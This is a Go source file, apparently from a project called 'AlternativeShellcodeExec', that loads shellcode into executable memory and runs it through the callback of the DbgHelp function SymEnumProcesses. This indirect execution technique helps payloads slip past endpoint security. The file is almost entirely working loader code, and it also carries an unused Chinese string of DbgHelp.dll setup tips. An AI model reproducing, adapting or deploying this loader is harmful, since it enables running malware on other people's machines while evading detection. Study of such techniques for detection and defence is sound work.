package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"syscall"
	"unsafe"
)

var _ = `这个错误提示在调用SymInitialize时出现问题。请确保安装了Microsoft Debugging Tools for Windows（适用于Windows的Microsoft调试工具），因为它包含了DbgHelp.dll。您可以从这里下载Microsoft Debugging Tools for Windows。

同时，还要确保DbgHelp.dll位于系统的PATH环境变量中，这样程序就可以找到它。要检查和修改PATH环境变量，请按照以下步骤操作：

按Windows键+X，在弹出的快速访问菜单中选择“系统”。
在系统窗口中，点击“高级系统设置”。
在“系统属性”对话框中，选择“高级”选项卡，然后点击“环境变量”按钮。
在“环境变量”对话框中，找到“系统变量”部分下的Path变量，双击它。
在“编辑环境变量”对话框中，将包含DbgHelp.dll的文件夹路径添加到列表中，然后单击“确定”。
在添加了路径并重新启动应用程序后，您应该不会再收到这个错误消息。
`

// Constants
const (
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
)

type (
	// Define the callback type for SymEnumProcesses
	SymEnumProcessesProc func(hProcess syscall.Handle, UserContext uintptr) uintptr
)

// Run function takes an op byte array as input and performs the operations.
func Run(op []byte) {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	dbghelp := syscall.NewLazyDLL("Dbghelp.dll")

	// Load required functions from DLLs
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	rtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
	symInitialize := dbghelp.NewProc("SymInitialize")
	symEnumProcesses := dbghelp.NewProc("SymEnumProcesses")

	// Allocate memory
	address, _, err := virtualAlloc.Call(0, uintptr(len(op)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if address == 0 {
		fmt.Printf("Error: Unable to allocate memory: %v\n", err)
		return
	}

	// Copy shellcode to allocated memory
	rtlMoveMemory.Call(address, (uintptr)(unsafe.Pointer(&op[0])), uintptr(len(op)))

	// Initialize symbol handler
	getCurrentProcess := kernel32.NewProc("GetCurrentProcess")
	hProcess, _, err := getCurrentProcess.Call()
	ret, _, err := symInitialize.Call(hProcess, 0, 1)
	if ret == 0 {
		fmt.Printf("Error: Unable to initialize symbol handler: %v\n", err)
		return
	}
	// Run shellcode as callback for SymEnumProcesses
	if address != 0 {
		ret, _, err = symEnumProcesses.Call(address, 0)
		if ret == 0 {
			fmt.Printf("Error: Unable to run shellcode as callback for SymEnumProcesses: %v\n", err)
			return
		}
	}
}

func main() {
	Run(util.ShellCode())
}
